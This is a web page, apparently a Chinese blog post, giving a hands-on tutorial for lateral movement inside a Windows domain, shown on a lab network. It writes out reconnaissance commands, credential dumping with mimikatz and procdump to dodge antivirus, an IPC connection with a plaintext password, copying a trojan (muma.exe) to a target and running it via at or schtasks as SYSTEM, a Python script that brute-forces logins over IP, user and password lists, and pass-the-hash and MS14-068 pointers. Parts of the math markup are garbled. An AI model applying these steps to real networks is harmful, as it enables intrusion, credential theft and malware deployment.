@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>内网渗透-实战|手把手教你如何进行内网渗透 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="内网渗透-实战|手把手教你如何进行内网渗透" />
+<meta property="og:description" content="实战|手把手教你如何进行内网渗透 x00 Preface 内网渗透主要是基于前期外围打点getshell的webserver，通过收集webserver上的信息，然后对其他内网主机进行口令上的攻击，当然也有一些基于漏洞的攻击。
+内网相关概念这里不再进行介绍，大家可以自行百度，诸如什么是域、域与工作组的区别、什么是DC、什么是AD等。当然，概念是生涩难懂的，结合实际环境会有助于理解。某内网靶场的详细教程：Vulnstack（一）
+内网渗透过程中经常会涉及到内网穿透，如何理解内网穿透以及端口转发、端口映射等相关知识可以参考：如何从零构建对内网穿透的理解
+实操部分写的比较草率，主要是为了增强认知、扩展思路、扩充知识面。实际上有很多优秀的集成化工具，很少会拆分开来单独使用这些方法。当然，大多数情况下是要考虑免杀的，免杀时可能会将某一步操作拆分出来，单独进行免杀和利用。
+0x01 信息收集 查看系统详细信息，如OS版本、补丁安装情况，可以根据这些信息筛选可利用的漏洞：
+systeminfo
+查看启动进程，可以根据启动进程判断主机在域中扮演的角色：
+net start
+查看进程列表：
+tasklist
+#查看端口开放情况：
+netstat -ano
+判断是否存在域：
+net view /domain
+查看主机名、域DNS、IP：
+ipconfig /all
+查看域内主机：
+net view
+域内主机以域服务器时间为准，故该命令可用于判断DC：
+net time /domain
+查看IP：
+nslookup 域名
+查看登录信息：
+net config workstation
+查看用户信息：
+whoami /all
+查看域内用户，可以将其作为字典，对其他主机的密码进行爆破：
+net user /domain
+这个命令在DC上可以直接执行，在其他域主机上执行要求打开DC的RPC服务。
+探针域内存活主机：
+for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr “TTL=”
+当然也可以借助nmap、masscan等第三方工具或empire、nishang等第三方脚本，但是使用系统命令的最大好处就是不用考虑免杀。
+域内其实还有一台机器STU1，但它开了防火墙，所以是禁ping的，这可能也是前面net view时没有显示STU1的原因。我们关了防火墙再试一遍：
+计算机用户Hash、明文获取：
+mimikatz：Win；mimipenguin：Linux。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/06030991578e5b6b6882f8030fab174b/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-20T00:35:16+08:00" />
+<meta property="article:modified_time" content="2023-01-20T00:35:16+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">内网渗透-实战|手把手教你如何进行内网渗透</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h2><a id="_0"></a>实战|手把手教你如何进行内网渗透</h2> 
+<h2><a id="x00_Preface_1"></a>x00 Preface</h2> 
+<p>内网渗透主要是基于前期外围打点getshell的webserver，通过收集webserver上的信息，然后对其他内网主机进行口令上的攻击，当然也有一些基于漏洞的攻击。</p> 
+<p>内网相关概念这里不再进行介绍，大家可以自行百度，诸如什么是域、域与工作组的区别、什么是DC、什么是AD等。当然，概念是生涩难懂的，结合实际环境会有助于理解。某内网靶场的详细教程：Vulnstack（一）</p> 
+<p>内网渗透过程中经常会涉及到内网穿透，如何理解内网穿透以及端口转发、端口映射等相关知识可以参考：如何从零构建对内网穿透的理解</p> 
+<p>实操部分写的比较草率，主要是为了增强认知、扩展思路、扩充知识面。实际上有很多优秀的集成化工具，很少会拆分开来单独使用这些方法。当然，大多数情况下是要考虑免杀的，免杀时可能会将某一步操作拆分出来，单独进行免杀和利用。</p> 
+<h2><a id="0x01__9"></a>0x01 信息收集</h2> 
+<p>查看系统详细信息，如OS版本、补丁安装情况，可以根据这些信息筛选可利用的漏洞：<br> systeminfo<br> <img src="https://images2.imgbox.com/d4/d1/1CJ3n8hV_o.png" alt="在这里插入图片描述"><br> 查看启动进程，可以根据启动进程判断主机在域中扮演的角色：<br> net start<br> <img src="https://images2.imgbox.com/1c/3a/zomnii0O_o.png" alt="在这里插入图片描述"><br> 查看进程列表：<br> tasklist<br> <img src="https://images2.imgbox.com/37/2a/LcDSS4f2_o.png" alt="在这里插入图片描述"><br> #查看端口开放情况：<br> netstat -ano<br> <img src="https://images2.imgbox.com/97/a7/SpjyTh6h_o.png" alt="在这里插入图片描述"><br> 判断是否存在域：<br> net view /domain<br> <img src="https://images2.imgbox.com/6c/3e/hBbeajYg_o.png" alt="在这里插入图片描述"><br> 查看主机名、域DNS、IP：<br> ipconfig /all<br> <img src="https://images2.imgbox.com/dc/cb/eAXdatV4_o.png" alt="在这里插入图片描述"><br> 查看域内主机：<br> net view<br> <img src="https://images2.imgbox.com/f9/df/lYKMv1dK_o.png" alt="在这里插入图片描述"><br> 域内主机以域服务器时间为准，故该命令可用于判断DC：<br> net time /domain<br> <img src="https://images2.imgbox.com/fd/95/6eTFXBiO_o.png" alt="在这里插入图片描述"><br> 查看IP：<br> nslookup 域名<img src="https://images2.imgbox.com/32/73/knx64Khu_o.png" alt="在这里插入图片描述"><br> 查看登录信息：<br> net config workstation<br> <img src="https://images2.imgbox.com/97/87/sriImIC8_o.png" alt="在这里插入图片描述"><br> 查看用户信息：<br> whoami /all<br> <img src="https://images2.imgbox.com/a6/2e/lSxOLIIf_o.png" alt="在这里插入图片描述"><br> 查看域内用户，可以将其作为字典，对其他主机的密码进行爆破：<br> net user /domain<img src="https://images2.imgbox.com/a7/0a/mtZ6s7IQ_o.png" alt="在这里插入图片描述"><br> 这个命令在DC上可以直接执行，在其他域主机上执行要求打开DC的RPC服务。<br> <img src="https://images2.imgbox.com/0c/c9/B8GSB66S_o.png" alt="在这里插入图片描述"><br> 探针域内存活主机：</p> 
+<blockquote> 
+ <p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr “TTL=”</p> 
+</blockquote> 
+<p><img src="https://images2.imgbox.com/5a/fd/BwUWX3VM_o.png" alt="在这里插入图片描述"><br> 当然也可以借助nmap、masscan等第三方工具或empire、nishang等第三方脚本，但是使用系统命令的最大好处就是不用考虑免杀。</p> 
+<p>域内其实还有一台机器STU1，但它开了防火墙，所以是禁ping的，这可能也是前面net view时没有显示STU1的原因。我们关了防火墙再试一遍：<img src="https://images2.imgbox.com/2b/89/ZEcyr5Th_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ab/ea/9vUcNP1N_o.png" alt="在这里插入图片描述"><br> 计算机用户Hash、明文获取：</p> 
+<p>mimikatz：Win；mimipenguin：Linux。</p> 
+<p>计算机各种协议、服务口令的获取：</p> 
+<p>LaZagne：适用于Windows、Linux、Mac。支持面广，但功能一般。</p> 
+<p>XenArmor：Win，付费。</p> 
+<p>探测域内存活主机及地址信息：</p> 
+<p>自带的内部命令（.bat）、nmap、masscan、powershell第三方脚本：empire、nishang。</p> 
+<p>需要注意的是，Mimikatz属于第三方软件，直接上传到目标主机可能被杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p> 
+<p>mimikatz下载：</p> 
+<blockquote> 
+ <p>https://github.com/gentilkiwi/mimikatz/releases</p> 
+</blockquote> 
+<p>procdump下载：</p> 
+<blockquote> 
+ <p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p> 
+</blockquote> 
+<h2><a id="0x02_IPCSMBVMI_76"></a>0x02 IPC&amp;SMB&amp;VMI</h2> 
+<p>前面已经说了，内网渗透主要是基于口令的攻击。同一域内的主机不计其数，域用户不计其数，为了便于记忆和管理，域成员的密码很多都会有重合。当我们拿到某个域成员的密码，就可以利用它把口子越撕越大，不断丰富我们的密码字典，然后不断地对域内主机进行爆破，直至拿下DC。</p> 
+<p>Windows提供了许多协议和相关功能，我们可以利用这些功能和协议传递用户的凭证进行验证。</p> 
+<h3><a id="SMB__80"></a>一、SMB 协议</h3> 
+<p>SMB 一种客户机/服务器、请求/响应协议。通过 SMB 协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。此外通过 SMB 协议，应用程序可以访问远程服务器端的文件、以及打印机、邮件槽（mailslot）、命名管道（named pipe）等资源。</p> 
+<p>在 TCP/IP 环境下，客户机通过 NetBIOS over TCP/IP（或 NetBEUI/TCP 或 SPX/IPX）连接服务器。一旦连接成功，客户机可发送 SMB</p> 
+<p>命令到服务器上，从而客户机能够访问共享目录、打开文件、读写文件，以及一切在文件系统上能做的所有事情。</p> 
+<p>这么说吧，域内最重要的是啥？一个是为了保障安全（内网与外网相隔绝），另一个就是资源共享，毕竟大家都是一条船上的人。SMB 协议就是用于实现各种资源的共享的，其中就包括IPC连接中的命名管道。</p> 
+<p>在Windows NT中SMB基于NBT实现。而在Windows2000中，SMB除了基于NBT的实现，还有直接通过445端口实现。NBT(NetBIOS over TCP/IP)：使用137, 138 (UDP) and 139 (TCP）来实现基于TCP/IP的NETBIOS网际互联。</p> 
+<p>我的理解就是，445是139的升级，139实现条件比445更苛刻，但两者都是为了实现SMB协议，因此两者并不冲突。在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现。</p> 
+<h3><a id="IPC_92"></a>二、IPC</h3> 
+<p>IPC（Inter-Process Communication，进程间通信），进程间通信是指两个进程的数据之间产生交互。进程间通信主要方式有共享内存、消息队列、管道等。其中共享内存主要用于同一计算机内进程间通信，消息队列和管道主要用于分布式环境（通信进程位于通过网络连接的不同计算机）。</p> 
+<p>“命名管道”又名“命名管线”（Named Pipes），是一种简单的进程间通信（IPC）机制，Microsoft Windows大都提供了对它的支持（但不包括Windows CE）。命名管道可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信。推荐用命名管道作为进程通信方案的一项重要的原因是它们充分利用了Windows内建的安全特性（ACL等）。</p> 
+<p>与TCP/IP（传输控制协议或internet协议）一样，命名管道是一种通讯协议。它一般用于局域网中，因为它要求客户端必须具有访问服务器资源的权限（SMB协议）。</p> 
+<p>在快速局域网 (LAN) 环境中，传输控制协议或 Internet 协议 (TCP/IP) 套接字客户端和 Named Pipes 客户端在性能方面不相上下。但是网络速度越慢，TCP/IP 套接字客户端与 Named Pipes 客户端的性能差异越明显。这是因为TCP/IP 套接字的数据传输的效率更高，开销也更少。数据传输还可以利用 TCP/IP 套接字性能增强机制的优点，如开窗口、延迟确认等，这在慢速网络中可能非常有益。而对于命名管道，通常网络通信交互性更强。一个对等项直到另一个对等项使用读取命令请求数据时才发送数据。在开始读取数据前，网络读取一般包括一系列窥视命名管道的信息。这在慢速网络中可能花费非常多并导致过多的网络流量，其它的网络客户端反过来也会受到影响。</p> 
+<p>使用命名管道的原因一般有两个方面：</p> 
+<p>提高速度：假设同样在局域网中，那么使用命名管道协议会比TCP/IP协议快一些。</p> 
+<p>增加安全性：因为命名管道是只能用于局域网的，那么如果服务器关闭了TCP/IP协议而仅启用命名管道，就可以避免一些安全隐患。</p> 
+<p>总结一下，FIFOs是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。因此，我们可以基于此实现对用户名和密码的爆破。需要注意的是，IPC$需要139或445端口的支持。</p> 
+<h3><a id="VMI_108"></a>三、VMI</h3> 
+<p>Windows管理工具（WMI）由一组扩展到的Windows驱动程序模型。WMI允许脚本语言（例如VBScript或Windows PowerShell）来本地或远程管理Microsoft Windows个人电脑和服务器。</p> 
+<p>简单来说，咱们在cmd或者powershell中使用的命令行语言，就是VMI支持的，它提供给我们一个接口如powershell，便于我们管理计算机。</p> 
+<p>谈及远程管理，延申几个比较重要的端口，如22、23、135、139、445、3389等。139、445端口我们前面已经讨论过了，22端口是linux的ssh，23端口是telnet，3389是远程桌面连接rdp，这些都比较好理解。咱们重点来说一下135端口。</p> 
+<p>135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够包括HTTP协议在内的多种网络传输。</p> 
+<p>进程间通信（IPC）是在多任务操作系统或联网的计算机之间运行的程序和进程所用的通信技术。有两种类型的进程间通信（IPC）。</p> 
+<p>本地过程调用(LPC)：LPC用在多任务操作系统中，使得同时运行的任务能互相会话。这些任务共享内存空间使任务同步和互相发送信息。</p> 
+<p>远程过程调用（RPC)：RPC类似于LPC，只是在网上工作。RPC开始是出现在Sun微系统公司和HP公司的运行UNⅨ操作系统的计算机中。</p> 
+<p>简单来说，RPC就是用于支持远程IPC的连接。无论是本地连接还是远程连接，都要依托于VMI服务进行管理。</p> 
+<h3><a id="_124"></a>四、小结</h3> 
+<p>SMB协议用于实现共享，IPC用于建立连接，不连接怎么共享？前面已经说了，共享是包括命名管道的，而命名管道正是连接方式，因此SMB协议的共享其实是包含IPC的，不仅如此，它还依赖于IPC连接。但是归根结底，对于连接后的计算机的远程管理，还是要依托于VMI。</p> 
+<h2><a id="0x03_atschtasks_126"></a>0x03 at&amp;schtasks</h2> 
+<p>at&amp;schtasks用于创建定时任务，其中at&lt;Windows2012，schtasks&gt;=Windows2012。</p> 
+<p>利用场景：</p> 
+<p>已拿下内网中一台主机的权限（webserver），掌握该主机的域用户名和密码，知道域内其他用户名。</p> 
+<p>利用流程：</p> 
+<blockquote> 
+ <p>1.建立IPC连接到目标主机（明文密码）<br> 2.copy要执行的命令脚本到目标主机<br> 3.查看目标时间，创建计划任务（at、schtasks）定时执行copy的脚本<br> 4.删除IPC连接</p> 
+</blockquote> 
+<p><img src="https://images2.imgbox.com/3d/8a/nlUrGRSA_o.png" alt="在这里插入图片描述"><br> 查看当前网络连接：<br> net use<img src="https://images2.imgbox.com/4a/42/EVzlo6vp_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/94/e1/YKtvh9vC_o.png" alt="在这里插入图片描述"><br> 使用明文密码hongrisec@2021与192.168.52.143的god\administrator用户建立远程IPC连接：</p> 
+<blockquote> 
+ <p>net use \192.168.52.143\ipc$ “hongrisec@2021” /user:god\administrator</p> 
+</blockquote> 
+<p><img src="https://images2.imgbox.com/6f/ab/Gf6GaSb8_o.png" alt="在这里插入图片描述"><br> 先将恶意文件上传到外围打点时拿下权限的webserver上，再通过前面建立的远程IPC连接将恶意文件从webserver copy到目标主机：</p> 
+<blockquote> 
+ <p>copy C:\Users\liukaifeng01\Desktop\muma.exe \192.168.52.143\C$</p> 
+</blockquote> 
+<p><img src="https://images2.imgbox.com/7f/df/wjq0OAgU_o.png" alt="在这里插入图片描述"></p> 
+<h3><a id="atWindows2012_151"></a>一、at&lt;Windows2012</h3> 
+<p>Windows2012以下版本，添加计时任务：</p> 
+<blockquote> 
+ <p>at \192.168.52.143 15:30 C:\muma.exe</p> 
+</blockquote> 
+<h3><a id="schtasksWindows2012_155"></a>二、schtasks&gt;=Windows2012</h3> 
+<p>Windows2012及以上版本，创建计时任务对应文件：</p> 
+<p>schtasks /create /s 192.168.52.143 /ru “SYSTEM” /tn adduser /sc DAILY /tr C:\muma.exe /F</p> 
+<p>运行adduser任务：</p> 
+<p>schtasks /run /s 192.168.52.143 /tn adduser</p> 
+<p>删除adduser任务：</p> 
+<p>schtasks /delete /s 192.168.52.143 /tn adduser</p> 
+<h3><a id="impacket_167"></a>三、impacket</h3> 
+<p>impacket是一个打包好的工具包，里面包含了对于各种协议和系统命令的利用工具。对于at&amp;schtasks，我们可以使用impacket中的atexec.exe，使用它可以轻松地进行远程连接并执行系统命令。<img src="https://images2.imgbox.com/91/11/s99onbzV_o.png" alt="在这里插入图片描述"><br> python版impacket下载：</p> 
+<p>https://github.com/SecureAuthCorp/impacket</p> 
+<p>exe版impacket下载：</p> 
+<p>https://gitee.com/RichChigga/impacket-examples-windows</p> 
+<p>在实战中，当我们拿下了webserver，获取了webserver上的密码以及所有的域用户、本地用户、域内存活主机IP后，我们就可以以用户为用户字典、IP为IP字典、密码为密码字典，进行批量连接（碰撞），探测哪些主机可以成功连接。一旦成功连接，便意味着我们可以通过计划任务等方式拿到连接的主机权限。拿到新的主机权限后，我们就可以获得新的主机密码，然后丰富自己的密码字典，再进行批量连接（碰撞）。循环往复，直至拿下DC。</p> 
+<p>如上图所示，使用bat脚本只能遍历一个变量，如果想要同时遍历三个变量，可以使用python。例如建立三个列表，使用三个循环进行遍历，循环生成命令执行语句（string），最后使用python os模块中的os.system()函数执行系统命令。但需要注意的是，域内主机上很可能没有python环境，因此我们需要借助python中的pyinstaller模块，它可以将py脚本打包成可执行文件，直接在windows上运行：</p> 
+<p>pip install pyinstaller<br> pyinstaller -F app.py</p> 
+<p>import os,time<br> ips={<!-- --><br> ‘192.168.3.21’,<br> ‘192.168.3.25’,<br> ‘192.168.3.29’,<br> ‘192.168.3.30’,<br> ‘192.168.3.31’,<br> ‘192.168.3.33’<br> }</p> 
+<p>users={<!-- --><br> ‘Administrator’,<br> ‘boss’,<br> ‘dbadmin’,<br> ‘fileadmin’,<br> ‘mack’,<br> ‘mary’,<br> ‘vpnadm’,<br> ‘webadmin’<br> }<br> passs={<!-- --><br> ‘admin’,<br> ‘admin!@#45’,<br> ‘Admin12345’<br> }</p> 
+<p>for ip in ips:<br> for user in users:<br> for mima in passs:<br> exec="net use "+ “”+ip+‘\ipc$ ‘+mima+’ /user:god’+user<br> print(‘—&gt;’+exec+‘&lt;—’)<br> os.system(exec)<br> time.sleep(1)</p> 
+<h2><a id="0x04_smbwmi_228"></a>0x04 smb&amp;wmi</h2> 
+<p>利用思路不变，变的仅是命令。<br> <img src="https://images2.imgbox.com/7c/8e/ywxce6MB_o.png" alt="在这里插入图片描述"><br> psexec是微软官方pstools中的工具，所以不需要考虑免杀。其中上图中说到，psexec第二种方法和smbexec无需建立IPC连接，我认为是不合理的。这几种方法只是命令不同罢了，提供明文账户密码的时候也是要建立IPC连接的，因为这个利用就是基于IPC的共享。</p> 
+<p>另外需要注意的就是，官方是不支持hash连接的，如果想要使用hash连接（仅能得到hash），可以使用impacket工具包，但是要做好免杀。<br> <img src="https://images2.imgbox.com/06/f1/Qc8NKbmj_o.png" alt="在这里插入图片描述"><br> 我个人认为，前面介绍的几种方法没啥区别，都是基于IPC<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
+     
+      
+       
+       
+         共享，都需要 
+        
+       
+         139 
+        
+       
+         / 
+        
+       
+         445 
+        
+       
+         端口的开启，初此之外，还离不开 
+        
+       
+         135 
+        
+       
+         端口，因为 
+        
+       
+         135 
+        
+       
+         端口时用于支持远程 
+        
+       
+         I 
+        
+       
+         P 
+        
+       
+         C 
+        
+       
+         建立的。 
+        
+       
+         I 
+        
+       
+         P 
+        
+       
+         C 
+        
+       
+      
+        共享，都需要139/445端口的开启，初此之外，还离不开135端口，因为135端口时用于支持远程IPC建立的。IPC 
+       
+      
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord cjk_fallback">共享，都需要</span><span class="mord">139/445</span><span class="mord cjk_fallback">端口的开启，初此之外，还离不开</span><span class="mord">135</span><span class="mord cjk_fallback">端口，因为</span><span class="mord">135</span><span class="mord cjk_fallback">端口时用于支持远程</span><span style="margin-right: 0.0785em;" class="mord mathnormal">I</span><span style="margin-right: 0.0715em;" class="mord mathnormal">PC</span><span class="mord cjk_fallback">建立的。</span><span style="margin-right: 0.0785em;" class="mord mathnormal">I</span><span style="margin-right: 0.0715em;" class="mord mathnormal">PC</span></span></span></span></span>共享的目的是为了便于管理员进行远程操作和管理，但是我们可以利用验证时的回显进行密码爆破。</p> 
+<h2><a id="0x05_pthptkptt_236"></a>0x05 pth&amp;ptk&amp;ptt</h2> 
+<p>PTH：pass the hash（LM、NTLM）<br> PTK：pass the key（AES 256）<br> PTT：pass the ticket</p> 
+<p>Windows2012及以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码。Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码。</p> 
+<p>针对以上情况，我们提供了如下解决方案：<br> 1.利用hash传递（pth、ptk等）进行移动<br> 2.利用注册表操作开启 Wdigest Auth 值进行获取<br> 3.利用工具或第三方平台（Hashcat）进行破解获取</p> 
+<p>Windows认证采用LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p> 
+<p>如果仅得到了Hash，既可以尝试在本机破解，也可以使用前面介绍的impacket。impacket中的工具能传递hash并能直接执行系统命令，优点：自带提权，命令简洁，功能强大。缺点：非官方工具，容易被杀。</p> 
+<p>PTH、PTK均可以使用mimikatz进行获取和攻击，这里不再赘述，mimikatz相关使用自行百度。</p> 
+<p>hash破解工具hashcat下载：https://github.com/hashcat/hashcat<br> <img src="https://images2.imgbox.com/9c/8f/BVuDykgg_o.png" alt="在这里插入图片描述"><br> 需要注意的是，只有打了补丁（KB2871997）才能使用ptk。</p> 
+<p>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的。</p> 
+<p>Kerberos 协议具体工作方法，在域中，简要介绍一下：</p> 
+<p>1.客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)</p> 
+<p>2.将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读取 kerberos 中 TGT 数据</p> 
+<p>3.然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测</p> 
+<p>4.检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将加密后的结果返回给客户机。</p> 
+<p>说白了，票据就跟cookie一样，我们需要获取新鲜的cookie（未过期，主机登录后十小时左右过期），然后注入内存当中，通过伪装混过认证。<br> <img src="https://images2.imgbox.com/c9/97/IXYMu2iL_o.png" alt="在这里插入图片描述"><br> 这个可以通过漏洞poc或工具进行利用，MS14-068下载：</p> 
+<blockquote> 
+ <p>https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p> 
+</blockquote> 
+<p>工具kekeo下载：</p> 
+<blockquote> 
+ <p>https://github.com/gentilkiwi/kekeo/releases</p> 
+</blockquote> 
+<p>0x05 Reference<br> SQL Server中的命名管道(named pipe)及其使用进程间通信（IPC）：共享内存和消息队列原理详解</p> 
+<p>命名管道 TCP/IP协议 匿名管道</p> 
+<p>Windows系统安全 | IPC<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
+     
+      
+       
+       
+         共享和其他共享 
+        
+       
+         ( 
+        
+       
+         C 
+        
+       
+      
+        共享和其他共享(C 
+       
+      
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord cjk_fallback">共享和其他共享</span><span class="mopen">(</span><span style="margin-right: 0.0715em;" class="mord mathnormal">C</span></span></span></span></span>、D<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
+     
+      
+       
+       
+         、 
+        
+       
+         A 
+        
+       
+         d 
+        
+       
+         m 
+        
+       
+         i 
+        
+       
+         n 
+        
+       
+      
+        、Admin 
+       
+      
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord cjk_fallback">、</span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mord mathnormal">min</span></span></span></span></span>)</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/2cf78a268605e2f0a96ce92a3ca8d6bc/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">安全运维 | Windows常用系统指令及服务总结</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/3f24bab22746bff9507b8dfb1ef5caeb/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">MySQL如何获取每个分组内前n条数据</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
